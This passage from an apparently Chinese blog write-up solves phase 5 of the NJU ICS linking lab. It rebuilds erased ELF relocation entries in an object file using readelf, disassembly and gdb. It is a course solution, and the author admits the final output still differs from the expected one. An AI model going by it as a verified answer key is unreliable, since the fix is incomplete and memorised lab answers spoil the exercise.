R_386_PC32        <span class="number">00000000</span>   <span class="built_in">strlen</span></span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000162</span>  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">000001</span>c0  <span class="number">00001302</span> R_386_PC32        <span class="number">00000000</span>   <span class="built_in">strlen</span></span><br><span class="line"><span class="number">000001e4</span>  <span class="number">00001101</span> R_386_32          <span class="number">00000080</span>   AycPNh</span><br><span class="line"><span class="number">000001</span>ea  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">00000246</span>  <span class="number">00001002</span> R_386_PC32        <span class="number">000000</span>ef   generate_code</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000256</span>  <span class="number">00000</span>c01 R_386_32          <span class="number">00000100</span>   tqdzfNje</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000268</span>  <span class="number">00001702</span> R_386_PC32        <span class="number">00000000</span>   <span class="built_in">puts</span></span><br></pre></td></tr></table></figure><p>可以看到有7个重定位信息被抹除了</p><p>贴一下符号表信息，后面要用</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; readelf -s phase5.o</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.symtab&#x27; contains 25 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 00000000     0 FILE    LOCAL  DEFAULT  ABS phase5.c</span><br><span class="line">     2: 00000000     0 SECTION LOCAL  DEFAULT    1 .text</span><br><span class="line">     3: 00000000     0 SECTION LOCAL  DEFAULT    3 .data</span><br><span class="line">     4: 00000000     0 SECTION LOCAL  DEFAULT    5 .bss</span><br><span class="line">     5: 00000000     0 SECTION LOCAL  DEFAULT    6 .rodata</span><br><span class="line">     6: 00000000     0 SECTION LOCAL  DEFAULT    9 .note.GNU-stack</span><br><span class="line">     7: 00000000     0 SECTION LOCAL  DEFAULT   10 .eh_frame</span><br><span class="line">     8: 00000000     0 SECTION LOCAL  DEFAULT    8 .comment</span><br><span class="line">     9: 00000000   250 OBJECT  GLOBAL DEFAULT    3 ohMkhV</span><br><span class="line">    10: 00000000    93 FUNC    GLOBAL DEFAULT    1 OOtZxJJdNH</span><br><span class="line">    11: 000000fc     4 OBJECT  GLOBAL DEFAULT    3 phase_id</span><br><span class="line">    12: 00000100    10 OBJECT  GLOBAL DEFAULT    3 tqdzfNje</span><br><span class="line">    13: 00000020    52 OBJECT  GLOBAL DEFAULT    6 yAnKQn</span><br><span class="line">    14: 0000010c     4 OBJECT  GLOBAL DEFAULT    3 aQSEth</span><br><span class="line">    15: 0000005d   146 FUNC    GLOBAL DEFAULT    1 transform_code</span><br><span class="line">    16: 000000ef    60 FUNC    GLOBAL DEFAULT    1 generate_code</span><br><span class="line">    17: 00000080   128 OBJECT  GLOBAL DEFAULT    6 AycPNh</span><br><span class="line">    18: 0000012b   136 FUNC    GLOBAL DEFAULT    1 encode_1</span><br><span class="line">    19: 00000000     0 NOTYPE  GLOBAL DEFAULT  UND strlen</span><br><span class="line">    20: 000001b3   135 FUNC    GLOBAL DEFAULT    1 encode_2</span><br><span class="line">    21: 00000110     8 OBJECT  GLOBAL DEFAULT    3 encoder</span><br><span class="line">    22: 0000023a    56 FUNC    GLOBAL DEFAULT    1 do_phase</span><br><span class="line">    23: 00000000     0 NOTYPE  GLOBAL DEFAULT  UND puts</span><br><span class="line">    24: 00000118     4 OBJECT  GLOBAL DEFAULT    3 phase</span><br></pre></td></tr></table></figure><p>gdb调试一个一个改吧</p><p><img src="/2023/05/08/ics4-linklab/image-20230507200104767.png" alt="image-20230507200104767"></p><h4 id="generate-code"><a href="#generate-code" class="headerlink" title="generate_code"></a>generate_code</h4><p>第一个错误发生在generate_code里</p><p><img src="/2023/05/08/ics4-linklab/image-20230507200258182.png" alt="image-20230507200258182"></p><p>确实没有做重定位</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">generate_code</span><span class="params">( <span class="type">int</span> cookie )</span> &#123;</span><br><span class="line">... = cookie;</span><br><span class="line"><span class="keyword">for</span>( i=<span class="number">0</span>; i&lt;...; i++ ) &#123;</span><br><span class="line">... = transform_code( ..., i );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从框架里看出是调用了transform_code函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">000000</span>ef &lt;generate_code&gt;:</span><br><span class="line">  ef:    <span class="number">55</span>                   push   %ebp</span><br><span class="line">  f0:    <span class="number">89</span> e5                mov    %esp,%ebp</span><br><span class="line">  f2:    <span class="number">83</span> ec <span class="number">10</span>             sub    $<span class="number">0x10</span>,%esp</span><br><span class="line">  f5:    <span class="number">8b</span> <span class="number">45</span> <span class="number">08</span>             mov    <span class="number">0x8</span>(%ebp),%eax</span><br><span class="line">  f8:    a3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    %eax,<span class="number">0x0</span></span><br><span class="line">  fd:    c7 <span class="number">45</span> fc <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> movl   $<span class="number">0x0</span>,<span class="number">-0x4</span>(%ebp)</span><br><span class="line"> <span class="number">104</span>:    eb <span class="number">1</span>a                jmp    <span class="number">120</span> &lt;generate_code+<span class="number">0x31</span>&gt;</span><br><span class="line"> <span class="number">106</span>:    a1 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    <span class="number">0x0</span>,%eax</span><br><span class="line"> <span class="number">10b</span>:    ff <span class="number">75</span> fc             push   <span class="number">-0x4</span>(%ebp)</span><br><span class="line"> <span class="number">10</span>e:    <span class="number">50</span>                   push   %eax</span><br><span class="line"> <span class="number">10f</span>:    e8 fc ff ff ff       call   <span class="number">110</span> &lt;generate_code+<span class="number">0x21</span>&gt;</span><br><span class="line"> <span class="number">114</span>:    <span class="number">83</span> c4 <span class="number">08</span>             add    $<span class="number">0x8</span>,%esp</span><br><span class="line"> <span class="number">117</span>:    a3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    %eax,<span class="number">0x0</span></span><br><span class="line"> <span class="number">11</span>c:    <span class="number">83</span> <span class="number">45</span> fc <span class="number">01</span>          addl   $<span class="number">0x1</span>,<span class="number">-0x4</span>(%ebp)</span><br><span class="line"> <span class="number">120</span>:    <span class="number">8b</span> <span class="number">45</span> fc             mov    <span class="number">-0x4</span>(%ebp),%eax</span><br><span class="line"> <span class="number">123</span>:    <span class="number">83</span> f8 <span class="number">0</span>c             cmp    $<span class="number">0xc</span>,%eax</span><br><span class="line"> <span class="number">126</span>:    <span class="number">76</span> de                jbe    <span class="number">106</span> &lt;generate_code+<span class="number">0x17</span>&gt;</span><br><span class="line"> <span class="number">128</span>:    <span class="number">90</span>                   nop</span><br><span class="line"> <span class="number">129</span>:    c9                   leave  </span><br><span class="line"> <span class="number">12</span>a:    c3                   ret    </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">10f</span>:    e8 fc ff ff ff       call   <span class="number">110</span> &lt;generate_code+<span class="number">0x21</span>&gt;</span><br></pre></td></tr></table></figure><p>这是我们要重定位得地方，怎么重定位可以看   <a href="https://grxer.github.io/2023/04/28/static-link/">https://grxer.github.io/2023/04/28/static-link/</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> Elf32_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> Elf32_Word;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset;<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word    r_info;<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure><p><strong>r_offset</strong>表示要修正的位置第一个字节相对于这个段的偏移</p><p>r_info 低8位表示要重定位类型，高24位是符号在符号表里的下标</p><p>r_offset为110，相对重定位类型 02 ，符号表里的下标 15即f</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">10</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">02</span> <span class="number">0f</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p><img src="/2023/05/08/ics4-linklab/image-20230507202240463.png" alt="image-20230507202240463"></p><p>ok了</p><p><img src="/2023/05/08/ics4-linklab/image-20230507202423749.png" alt="image-20230507202423749"></p><h4 id="transform-code"><a href="#transform-code" class="headerlink" title="transform_code"></a>transform_code</h4><p>接下来错误发生在transform_code里</p><p><img src="/2023/05/08/ics4-linklab/image-20230507202626683.png" alt="image-20230507202626683"></p><p><img src="/2023/05/08/ics4-linklab/image-20230507202705410.png" alt="image-20230507202705410"></p><p>很熟悉的指令8b 04 85，我们上一个switch刚碰到过…</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">transform_code</span><span class="params">( <span class="type">int</span> code, <span class="type">int</span> mode )</span> &#123;</span><br><span class="line"><span class="keyword">switch</span> ( yAnKQn[mode] ... )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>: ......</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>: ......</span><br><span class="line">......</span><br><span class="line"><span class="keyword">default</span>: ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> code;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000005</span>d &lt;transform_code&gt;:</span><br><span class="line">  <span class="number">5</span>d:    <span class="number">55</span>                   push   %ebp</span><br><span class="line">  <span class="number">5</span>e:    <span class="number">89</span> e5                mov    %esp,%ebp</span><br><span class="line">  <span class="number">60</span>:    <span class="number">8b</span> <span class="number">45</span> <span class="number">0</span>c             mov    <span class="number">0xc</span>(%ebp),%eax</span><br><span class="line">  <span class="number">63</span>:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br><span class="line">  <span class="number">6</span>a:    <span class="number">83</span> e0 <span class="number">07</span>             and    $<span class="number">0x7</span>,%eax</span><br><span class="line">  <span class="number">6</span>d:    <span class="number">83</span> f8 <span class="number">07</span>             cmp    $<span class="number">0x7</span>,%eax</span><br><span class="line">  <span class="number">70</span>:    <span class="number">77</span> <span class="number">74</span>                ja     e6 &lt;transform_code+<span class="number">0x89</span>&gt;</span><br><span class="line">  <span class="number">72</span>:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">54</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x54</span>(,%eax,<span class="number">4</span>),%eax</span><br><span class="line">  <span class="number">79</span>:    ff e0                jmp    *%eax</span><br><span class="line">  <span class="number">7b</span>:    f7 <span class="number">55</span> <span class="number">08</span>             notl   <span class="number">0x8</span>(%ebp)</span><br><span class="line">  <span class="number">7</span>e:    eb <span class="number">6</span>a                jmp    ea &lt;transform_code+<span class="number">0x8d</span>&gt;</span><br><span class="line">  <span class="number">80</span>:    <span class="number">8b</span> <span class="number">45</span> <span class="number">0</span>c             mov    <span class="number">0xc</span>(%ebp),%eax</span><br><span class="line">  <span class="number">83</span>:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br><span class="line">  <span class="number">8</span>a:    <span class="number">83</span> e0 <span class="number">03</span>             and    $<span class="number">0x3</span>,%eax</span><br><span class="line">  <span class="number">8</span>d:    <span class="number">89</span> c1                mov    %eax,%ecx</span><br><span class="line">  <span class="number">8f</span>:    d3 <span class="number">7</span>d <span class="number">08</span>             sarl   %cl,<span class="number">0x8</span>(%ebp)</span><br><span class="line">  <span class="number">92</span>:    eb <span class="number">56</span>                jmp    ea &lt;transform_code+<span class="number">0x8d</span>&gt;</span><br><span class="line">  <span class="number">94</span>:    <span class="number">8b</span> <span class="number">45</span> <span class="number">0</span>c             mov    <span class="number">0xc</span>(%ebp),%eax</span><br><span class="line">  <span class="number">97</span>:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br><span class="line">  <span class="number">9</span>e:    f7 d0                not    %eax</span><br><span class="line">  a0:    <span class="number">21</span> <span class="number">45</span> <span class="number">08</span>             and    %eax,<span class="number">0x8</span>(%ebp)</span><br><span class="line">  a3:    eb <span class="number">45</span>                jmp    ea &lt;transform_code+<span class="number">0x8d</span>&gt;</span><br><span class="line">  a5:    <span class="number">8b</span> <span class="number">45</span> <span class="number">0</span>c             mov    <span class="number">0xc</span>(%ebp),%eax</span><br><span class="line">  a8:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br><span class="line">  af:    c1 e0 <span class="number">08</span>             shl    $<span class="number">0x8</span>,%eax</span><br><span class="line">  b2:    <span class="number">09</span> <span class="number">45</span> <span class="number">08</span>             or     %eax,<span class="number">0x8</span>(%ebp)</span><br><span class="line">  b5:    eb <span class="number">33</span>                jmp    ea &lt;transform_code+<span class="number">0x8d</span>&gt;</span><br><span class="line">  b7:    <span class="number">8b</span> <span class="number">45</span> <span class="number">0</span>c             mov    <span class="number">0xc</span>(%ebp),%eax</span><br><span class="line">  ba:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br><span class="line">  c1:    <span class="number">31</span> <span class="number">45</span> <span class="number">08</span>             xor    %eax,<span class="number">0x8</span>(%ebp)</span><br><span class="line">  c4:    eb <span class="number">24</span>                jmp    ea &lt;transform_code+<span class="number">0x8d</span>&gt;</span><br><span class="line">  c6:    <span class="number">8b</span> <span class="number">45</span> <span class="number">0</span>c             mov    <span class="number">0xc</span>(%ebp),%eax</span><br><span class="line">  c9:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br><span class="line">  d0:    f7 d0                not    %eax</span><br><span class="line">  d2:    <span class="number">09</span> <span class="number">45</span> <span class="number">08</span>             or     %eax,<span class="number">0x8</span>(%ebp)</span><br><span class="line">  d5:    eb <span class="number">13</span>                jmp    ea &lt;transform_code+<span class="number">0x8d</span>&gt;</span><br><span class="line">  d7:    <span class="number">8b</span> <span class="number">45</span> <span class="number">0</span>c             mov    <span class="number">0xc</span>(%ebp),%eax</span><br><span class="line">  da:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br><span class="line">  e1:    <span class="number">01</span> <span class="number">45</span> <span class="number">08</span>             add    %eax,<span class="number">0x8</span>(%ebp)</span><br><span class="line">  e4:    eb <span class="number">04</span>                jmp    ea &lt;transform_code+<span class="number">0x8d</span>&gt;</span><br><span class="line">  e6:    f7 <span class="number">5</span>d <span class="number">08</span>             negl   <span class="number">0x8</span>(%ebp)</span><br><span class="line">  e9:    <span class="number">90</span>                   nop</span><br><span class="line">  ea:    <span class="number">8b</span> <span class="number">45</span> <span class="number">08</span>             mov    <span class="number">0x8</span>(%ebp),%eax</span><br><span class="line">  ed:    <span class="number">5</span>d                   pop    %ebp</span><br><span class="line">  ee:    c3                   ret    </span><br></pre></td></tr></table></figure><p>5d+58(十进制)&#x3D;0x97</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">97</span>:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br></pre></td></tr></table></figure><p>这里应该是.rodata数据yAnKQn的重定位了</p><p>r_offset 97+3&#x3D;9a 类型 01 yAnKQn符号下标13即d</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">9</span>A <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">01</span> <span class="number">0</span>D <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p><img src="/2023/05/08/ics4-linklab/image-20230507205421832.png" alt="image-20230507205421832"></p><p>下一个错误</p><p><img src="/2023/05/08/ics4-linklab/image-20230507205323580.png" alt="image-20230507205323580"></p><p><img src="/2023/05/08/ics4-linklab/image-20230507205344052.png" alt="image-20230507205344052"></p><p>还是一样的</p><p>0x5d+75(十进制)&#x3D;0xA8</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">a8:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br></pre></td></tr></table></figure><p>offset &#x3D;a8+3&#x3D;AB 其余和上面一样</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AB <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">01</span> <span class="number">0</span>D <span class="number">00</span> <span class="number">00</span> </span><br></pre></td></tr></table></figure><p><img src="/2023/05/08/ics4-linklab/image-20230507205815532.png" alt="image-20230507205815532"></p><p>后面又改了一个一样的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">da:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DD <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">01</span> <span class="number">0</span>D <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p><img src="/2023/05/08/ics4-linklab/image-20230507210127236.png" alt="image-20230507210127236"></p><h4 id="do-phase"><a href="#do-phase" class="headerlink" title="do_phase"></a>do_phase</h4><p><img src="/2023/05/08/ics4-linklab/image-20230507210234694.png" alt="image-20230507210234694"></p><p><img src="/2023/05/08/ics4-linklab/image-20230507210250054.png" alt="image-20230507210250054"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">do_phase</span><span class="params">()</span> &#123;</span><br><span class="line">generate_code(...);</span><br><span class="line">......; <span class="comment">// Call one encoder here</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, ...);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000023</span>a &lt;do_phase&gt;:</span><br><span class="line"> <span class="number">23</span>a:    <span class="number">55</span>                   push   %ebp</span><br><span class="line"> <span class="number">23b</span>:    <span class="number">89</span> e5                mov    %esp,%ebp</span><br><span class="line"> <span class="number">23</span>d:    <span class="number">83</span> ec <span class="number">08</span>             sub    $<span class="number">0x8</span>,%esp</span><br><span class="line"> <span class="number">240</span>:    <span class="number">68</span> f3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       push   $<span class="number">0xf3</span></span><br><span class="line"> <span class="number">245</span>:    e8 fc ff ff ff       call   <span class="number">246</span> &lt;do_phase+<span class="number">0xc</span>&gt;<span class="comment">//call 的是generate_code</span></span><br><span class="line"> <span class="number">24</span>a:    <span class="number">83</span> c4 <span class="number">04</span>             add    $<span class="number">0x4</span>,%esp</span><br><span class="line"> <span class="number">24</span>d:    a1 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    <span class="number">0x4</span>,%eax</span><br><span class="line"> <span class="number">252</span>:    <span class="number">83</span> ec <span class="number">0</span>c             sub    $<span class="number">0xc</span>,%esp</span><br><span class="line"> <span class="number">255</span>:    <span class="number">68</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       push   $<span class="number">0x0</span></span><br><span class="line"> <span class="number">25</span>a:    ff d0                call   *%eax</span><br><span class="line"> <span class="number">25</span>c:    <span class="number">83</span> c4 <span class="number">10</span>             add    $<span class="number">0x10</span>,%esp</span><br><span class="line"> <span class="number">25f</span>:    <span class="number">83</span> ec <span class="number">0</span>c             sub    $<span class="number">0xc</span>,%esp</span><br><span class="line"> <span class="number">262</span>:    <span class="number">68</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       push   $<span class="number">0x0</span></span><br><span class="line"> <span class="number">267</span>:    e8 fc ff ff ff       call   <span class="number">268</span> &lt;do_phase+<span class="number">0x2e</span>&gt;<span class="comment">//框架里虽然是printf，被编译器优化为了puts</span></span><br><span class="line"> <span class="number">26</span>c:    <span class="number">83</span> c4 <span class="number">10</span>             add    $<span class="number">0x10</span>,%esp</span><br><span class="line"> <span class="number">26f</span>:    <span class="number">90</span>                   nop</span><br><span class="line"> <span class="number">270</span>:    c9                   leave  </span><br><span class="line"> <span class="number">271</span>:    c3                   ret    </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">24</span>d:    a1 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    <span class="number">0x4</span>,%eax</span><br></pre></td></tr></table></figure><p>结合框架和call   *%eax，这里应该重定位一个encoder函数，</p><p>offset 24d+1&#x3D;24e,他的初始偏移为4估计是绝对地址重定位 01 encoder符号下标21即0x15</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">4</span>E <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">01</span> <span class="number">15</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p>下一个错误</p><p><img src="/2023/05/08/ics4-linklab/image-20230507212648240.png" alt="image-20230507212648240"></p><p>push了0做参数，puts必报错，这里就是我们的空指针指向的地方</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">262</span>:    <span class="number">68</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       push   $<span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>那push什么呢</p><p>可以看到encoder函数参数，是tqdzfNje</p><p><img src="/2023/05/08/ics4-linklab/image-20230507213134515.png" alt="image-20230507213134515"></p><p>输出的想必就是encode后的内容</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">63</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">01</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p><img src="/2023/05/08/ics4-linklab/image-20230507214005609.png" alt="image-20230507214005609"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">UuUHH[[!?</span><br></pre></td></tr></table></figure><p>有输出但结果不太对，tmd</p><p><img src="/2023/05/08/ics4-linklab/image-20230507220450148.png" alt="image-20230507220450148"></p><p>看来一下encoder调用的是encode_2</p><p><img src="/2023/05/08/ics4-linklab/image-20230507220550289.png" alt="image-20230507220550289"></p><p>发现他是一个指针数组，确实他在符号表里的size显示的也是8</p><p>那肯定encode_1是正确答案了,由于是<code>call   *%eax</code>call的eax里的内容所以不能直接把 encode_1的函数符号写到重定位信息里</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Relocation section <span class="string">&#x27;.rel.data&#x27;</span> at offset <span class="number">0x8b0</span> contains <span class="number">4</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">000000f</span>c  <span class="number">00000501</span> R_386_32          <span class="number">00000000</span>   .rodata</span><br><span class="line"><span class="number">00000110</span>  <span class="number">00001201</span> R_386_32          <span class="number">0000012b</span>   encode_1</span><br><span class="line"><span class="number">00000114</span>  <span class="number">00001401</span> R_386_32          <span class="number">000001b</span>3   encode_2</span><br><span class="line"><span class="number">00000118</span>  <span class="number">00001601</span> R_386_32          <span class="number">0000023</span>a   do_phase</span><br></pre></td></tr></table></figure><p>那就直接把他encode_2的重定位信息改成encode_1就好了，这样调用encode_2的也就是encode_1了</p><p><img src="/2023/05/08/ics4-linklab/image-20230507222739182.png" alt="image-20230507222739182"></p><p><img src="/2023/05/08/ics4-linklab/image-20230507222657681.png" alt="image-20230507222657681"></p><p>欧克了</p><h4 id="encode-1"><a href="#encode-1" class="headerlink" title="encode_1"></a>encode_1</h4><p>运行一下，额，encode_1报错了，不过也说明方向对了</p><p><img src="/2023/05/08/ics4-linklab/image-20230507223022320.png" alt="image-20230507223022320"></p><p>不过重定位什么呢</p><p>看了下encode_2</p><p><img src="/2023/05/08/ics4-linklab/image-20230507223526485.png" alt="image-20230507223526485"></p><p><img src="/2023/05/08/ics4-linklab/image-20230507223541678.png" alt="image-20230507223541678"></p><p>他填了AycPNh,我们也填这个试试看把</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">159</span>:    <span class="number">0f</span> b6 <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> movzbl <span class="number">0x0</span>(%eax),%eax</span><br></pre></td></tr></table></figure><p>0x159+3&#x3D;15C  17&#x3D;0x11</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">5</span>C <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">01</span> <span class="number">11</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie -o linkbomb main.o phase5.</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">%?%<span class="number">00</span>##Y?</span><br></pre></td></tr></table></figure><p>额，后面我试光了所以变量符号，都没有和pdf里一样的输出，就这样把，反正已经重定位了7处</p><p>重定位完后的重定位表</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; readelf -r phase5.o</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.text&#x27;</span> at offset <span class="number">0x7f8</span> contains <span class="number">23</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">00000066</span>  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000075</span>  <span class="number">00000501</span> R_386_32          <span class="number">00000000</span>   .rodata</span><br><span class="line"><span class="number">00000086</span>  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000110</span>  <span class="number">00000f</span>02 R_386_PC32        <span class="number">0000005</span>d   transform_code</span><br><span class="line"><span class="number">0000009</span>a  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">000000b</span>d  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">000000</span>cc  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">000000</span>ab  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">000000f</span>9  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">00000107</span>  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">000000</span>dd  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000118</span>  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">00000138</span>  <span class="number">00001302</span> R_386_PC32        <span class="number">00000000</span>   <span class="built_in">strlen</span></span><br><span class="line"><span class="number">0000024</span>e  <span class="number">00001501</span> R_386_32          <span class="number">00000110</span>   encoder</span><br><span class="line"><span class="number">00000162</span>  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">000001</span>c0  <span class="number">00001302</span> R_386_PC32        <span class="number">00000000</span>   <span class="built_in">strlen</span></span><br><span class="line"><span class="number">000001e4</span>  <span class="number">00001101</span> R_386_32          